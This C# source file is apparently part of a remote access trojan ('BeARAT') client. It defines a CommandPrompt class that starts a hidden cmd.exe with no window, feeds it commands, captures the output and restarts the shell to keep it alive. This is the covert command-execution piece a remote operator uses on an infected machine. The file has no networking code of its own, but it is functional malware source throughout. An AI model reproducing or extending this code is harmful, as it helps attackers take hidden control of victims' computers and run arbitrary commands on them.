using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BeARAT.Client.Execs
{
    class CommandPrompt : Shell
    {
        private const string FILENAME = "cmd.exe";

        Process process;

        private string _stdIn;
        private string _stdOut;
        private bool _isRunning;

        public CommandPrompt() : base(FILENAME)
        {
            _stdIn = "";
            _stdOut = "";
            _isRunning = false;

            process = new Process();
            process.StartInfo.FileName = FILENAME;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;

            process.Start();
        }

        public override void Execute()
        {
            _isRunning = true;

            using (StreamWriter writer = process.StandardInput)
            {
                if (writer.BaseStream.CanWrite)
                {
                    writer.WriteLine(_stdIn);
                }
            }

            process.WaitForExit();
            System.Threading.Thread.Sleep(200);

            using (StreamReader reader = process.StandardOutput)
            {
                if (reader.BaseStream.CanRead)
                {
                    _stdOut = reader.ReadToEnd();
                }
            }

            _isRunning = false;
            process.Start(); // restart process, in order to keep it running.
        }

        public override string StdOut()
        {
            return _stdOut;
        }

        public override bool IsRunning()
        {
            return !process.HasExited || _isRunning;
        }

        public override void StdIn(string stdIn)
        {
            this._stdIn = stdIn;
        }
    }
}
